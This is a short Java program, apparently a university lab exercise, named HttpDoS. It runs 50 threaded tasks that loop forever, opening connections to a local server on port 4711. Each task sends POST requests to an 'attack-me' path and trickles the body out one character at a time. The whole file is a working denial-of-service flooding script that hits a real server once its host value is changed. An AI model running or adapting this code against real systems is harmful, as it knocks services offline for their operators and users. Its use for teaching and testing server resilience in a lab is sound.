package dk.cphbusiness.week13.code;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class HttpDoS {
    Boolean bool = false;
    

    public static void main(String args[]) {


        int numberOfTasks = 50;
        ExecutorService executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());
        try {
            for (int i = 0; i < numberOfTasks; i++) {
                executor.execute(new MyRunnable(i));
                System.out.println("hey: " + i);
            }
            TimeUnit.MINUTES.sleep(2);
            System.out.println("HERE");
            executor.shutdown();
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}

class MyRunnable implements Runnable {

    //byte[] bytes = new byte[10000];
    //int count = 0;
    String HOST = "127.0.0.1";
    int PORT = 4711;
    int id;

    public MyRunnable(int i) {
        this.id = i;
    }

    @Override
    public void run() {
        while (true) {
            System.out.print("Thread");
            try (Socket socket = new Socket(HOST, PORT)) {

                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                out.println("POST /attack-me HTTP/1.1");
                out.println("Content-Type: text/plain");
                out.println("Content-Length: 12");
                out.println();
                for (int i = 0; i < 12; i++) {
                    out.print("Hello World!".charAt(i));
                    out.flush();
                }
//                count = socket.getInputStream().read(bytes);
//                String text = new String(bytes, 0, count, "UTF-8");
//                System.out.println(text);
                socket.close();
            } catch (Exception e) {
                System.err.println("!! " + e);
            }
        }
    }
}
